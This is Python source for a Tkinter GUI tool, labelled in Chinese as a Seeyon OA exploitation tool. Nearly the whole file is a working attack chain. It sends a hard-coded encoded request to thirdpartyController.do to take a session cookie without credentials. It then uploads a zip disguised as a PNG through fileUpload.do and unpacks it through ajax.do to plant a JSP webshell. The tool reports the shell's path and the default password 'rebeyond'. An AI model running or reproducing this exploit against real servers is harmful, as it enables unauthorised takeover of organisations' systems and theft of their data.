#!/usr/bin/env python
# -*- coding: utf-8 -*-
from tkinter import *
import requests
import sys
import random
import time
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from os.path import abspath
from inspect import getsourcefile

abspath(getsourcefile(lambda: 0))
LOG_LINE_NUM = 0


class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("致远OA漏洞利用工具  By：XiaoBai")
        self.init_window_name.geometry('800x400+10+10')
        # 标签
        self.init_data_label = Label(self.init_window_name, text="网址")
        self.init_data_label.grid(row=0, column=0)
        self.result_data_label = Label(self.init_window_name, text="结果")
        self.result_data_label.grid(row=0, column=0)
        self.log_label = Label(self.init_window_name, text="日志")
        self.log_label.grid(row=12, column=0)
        # 文本框
        self.init_data_Text = Text(self.init_window_name, width=50, height=5)
        self.init_data_Text.grid(row=1, column=0, rowspan=10, columnspan=10)
        self.result_data_Text = Text(self.init_window_name, width=50, height=18)
        self.result_data_Text.grid(row=1, column=12, rowspan=15, columnspan=10)
        self.log_data_Text = Text(self.init_window_name, width=50, height=10)
        self.log_data_Text.grid(row=13, column=0, columnspan=10)
        # 按钮
        self.exp_button = Button(self.init_window_name, text="Run", bg="lightblue", width=10,
                                 command=self.exp)
        self.exp_button.grid(row=1, column=10)

    # 功能函数
    def exp(self):
        target_url = self.init_data_Text.get(1.0, END).strip().replace("\n", "")
        vuln_url = target_url + "/seeyon/thirdpartyController.do"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04" \
               "+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1 "
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(
                    response.headers).lower():
                cookies = response.cookies
                cookies = requests.utils.dict_from_cookiejar(cookies)
                cookie = cookies['JSESSIONID']
                print("[+] 目标 {} 正在上传压缩包文件.... \n[+] Cookie: {} ".format(target_url, cookie))
                targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload'
                files = [('file1', ('360icon.png', open('Code/Shell.zip', 'rb'), 'image/png'))]
                headers = {'Cookie': "JSESSIONID=%s" % cookie}
                data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                        'isEncrypt': "0"}
                response = requests.post(url=targeturl, files=files, data=data, headers=headers, timeout=60,
                                         verify=False)
                reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'', response.text, re.I)
                if len(reg) == 0:
                    sys.exit("上传文件失败")
                vuln_url = target_url + '/seeyon/ajax.do'
                datestr = time.strftime('%Y-%m-%d')
                post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment' \
                       '&arguments' \
                       '=%5B0%2C%22' + datestr + '%22%2C%22' + \
                       reg[0] + '%22%5D'
                headers['Content-Type'] = "application/x-www-form-urlencoded"
                print("[*] 目标 {} 正在解压文件.... ".format(target_url))
                try:
                    response = requests.post(vuln_url, data=post, headers=headers, timeout=60, verify=False)
                    if response.status_code == 500:
                        shell_url = target_url + "/seeyon/common/designer/pageLayout/code.jsp"
                        print("[+] 目标 {} 解压文件成功.... ".format(target_url))
                        print("[+] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/code.jsp ".format(
                            target_url))
                        print("[+] 默认密码: rebeyond ".format(target_url))
                        print("[+] 如果目标webshell无法访问，请更换 Shell.zip 中的木马名称 ".format(target_url))
                        self.result_data_Text.insert(1.0, "[+]存在漏洞! Shell地址：" + shell_url + "，密码为rebeyond \n")
                        self.write_log_to_Text("INFO: " + target_url + " success")
                    else:
                        print("[-] 目标 {} 不存在漏洞 ".format(target_url))
                        self.result_data_Text.insert(1.0, "[-]" + target_url + "不存在漏洞! \n")
                        self.write_log_to_Text("INFO: " + target_url + " failed")
                except Exception as e:
                    print("[-] 目标 {} 请求失败 ".format(target_url), e)
                    self.result_data_Text.insert(1.0, "[-]" + target_url + "无法连接! \n")
                    self.write_log_to_Text("INFO: " + target_url + " failed")
            else:
                print("[-] 目标 {} 不存在漏洞 ".format(target_url))
                self.result_data_Text.insert(1.0, "[-]" + target_url + "不存在漏洞! \n")
                self.write_log_to_Text("INFO: " + target_url + " failed")
        except Exception as e:
            print("[-] 目标 {} 请求失败 ".format(target_url), e)
            self.result_data_Text.insert(1.0, "[-]" + target_url + "无法连接! \n")
            self.write_log_to_Text("INFO: " + target_url + " failed")

    # 获取当前时间
    def get_current_time(self):
        current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        return current_time

    # 日志动态打印
    def write_log_to_Text(self, logmsg):
        global LOG_LINE_NUM
        current_time = self.get_current_time()
        logmsg_in = str(current_time) + " " + str(logmsg) + "\n"  # 换行
        if LOG_LINE_NUM <= 7:
            self.log_data_Text.insert(END, logmsg_in)
            LOG_LINE_NUM = LOG_LINE_NUM + 1
        else:
            self.log_data_Text.delete(1.0, 2.0)
            self.log_data_Text.insert(END, logmsg_in)


def gui_start():
    init_window = Tk()  # 实例化出一个父窗口
    ZMJ_PORTAL = MY_GUI(init_window)
    # 设置根窗口默认属性
    ZMJ_PORTAL.set_init_window()
    init_window.mainloop()  # 父窗口进入事件循环，可以理解为保持窗口运行，否则界面不展示


gui_start()
